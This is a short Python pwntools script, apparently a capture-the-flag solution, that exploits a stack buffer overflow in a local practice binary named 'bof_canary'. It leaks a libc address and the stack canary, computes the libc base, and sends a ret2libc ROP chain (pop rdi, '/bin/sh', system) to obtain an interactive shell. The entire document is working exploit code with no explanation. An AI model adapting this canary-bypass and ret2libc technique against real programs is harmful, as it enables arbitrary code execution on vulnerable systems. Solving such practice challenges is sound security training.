from pwn import *

p = process("pwn2/bof_canary")


system_offset = 0x40db0
binsh_offset = 0x168f53
start_main_offset_inc = 0x20350 + 234


mes = "48\n"
mes += '1' * 48

p.sendline(mes)

resp = p.recvn(55)
addr = resp[48:54] + '\x00\x00'

addr = u64(addr)

print(hex(addr))


mes = "57\n"
mes += '1' * 57

p.send(mes)

resp = p.recvuntil("\n")

canary = resp[56:64]
canary = '\x00' + canary[1:]

print(canary)


mes = "72\n"
mes += '1' * 72

p.send(mes)

resp = p.recvuntil("\n")

start_main_addr = resp[72:78] + '\x00\x00'

start_main_addr = u64(start_main_addr)

print(hex(start_main_addr))

base = start_main_addr - start_main_offset_inc

mes = '1' * 56
mes += canary
mes += p64(0)
mes += p64(0x400833) # pop rdi;
mes += p64(base + binsh_offset)
mes += p64(base + system_offset)
mes = str(len(mes)) + '\n' + mes + '0\n'

p.send(mes)

p.interactive()